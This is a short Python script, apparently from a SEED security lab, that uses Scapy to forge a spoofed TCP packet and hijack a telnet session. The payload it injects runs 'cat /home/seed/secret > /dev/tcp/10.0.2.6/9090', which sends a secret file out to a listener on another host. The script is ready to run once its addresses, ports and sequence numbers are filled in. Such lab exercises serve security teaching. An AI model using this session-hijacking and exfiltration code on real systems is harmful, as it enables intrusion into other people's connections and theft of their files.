from scapy.all import *

def send_tcp_packet(src_ip, dst_ip, src_port, dst_port, seq_num, ack_num, ttl_value, window_size, payload):
    # Create IP layer with custom TTL
    ip_layer = IP(src=src_ip, dst=dst_ip, ttl=ttl_value)

    # Create TCP layer with custom sequence number, acknowledgment number, window size
    tcp_layer = TCP(sport=src_port, dport=dst_port, flags="A", seq=seq_num, ack=ack_num, window=window_size)

    # Create the complete packet by combining IP, TCP, and payload
    packet = ip_layer/tcp_layer/payload

    # Send the packet
    send(packet, verbose=0)
    print(f"Sent TCP packet from {src_ip}:{src_port} to {dst_ip}:{dst_port} with SEQ={seq_num}, ACK={ack_num}, TTL={ttl_value}, Window Size={window_size}")

# change the following 9 lines
source_ip = "10.0.2.4"
destination_ip = "10.0.2.5"
source_port = 45736
destination_port = 23
sequence_num = 1717083005
acknowledgment_num = 1242665292
ttl_value = 64
window_size = 501
tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"

# Send the packet
send_tcp_packet(source_ip, destination_ip, source_port, destination_port, sequence_num, acknowledgment_num, ttl_value, window_size, tcp_payload)

